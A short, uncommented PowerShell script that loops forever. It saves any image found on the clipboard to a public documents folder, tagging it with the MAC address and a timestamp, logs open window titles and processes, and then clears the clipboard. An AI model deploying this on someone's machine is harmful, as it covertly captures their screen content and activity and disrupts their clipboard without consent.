$window = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle).mainwindowtitle
$process = (Get-Process |where {$_.mainWindowTItle} | select processname).processname
$starttime = (Get-Process |where {$_.mainWindowTItle} | select starttime).starttime
$count = $window.count

$MAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"}).MacAddress
do {
$image = Get-Clipboard -Format Image
If ($image) 
{
$path = 'C:\Users\Public\Documents'
$filename = "$path\${mac}_"+(Get-date -f yyyyMMddHHmmss)+"_clip.png"
$image.Save($filename,'png')
for($i=0; $i -lt $count; $i++)
{
$window[$i] + ":::;" + $process[$i] + ":::;" + $starttime[$i] | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmmss)_clib_process.txt -Append -encoding utf8
}

sleep 5
Set-Clipboard -Value $Null
}

sleep 1
} 
while ($true)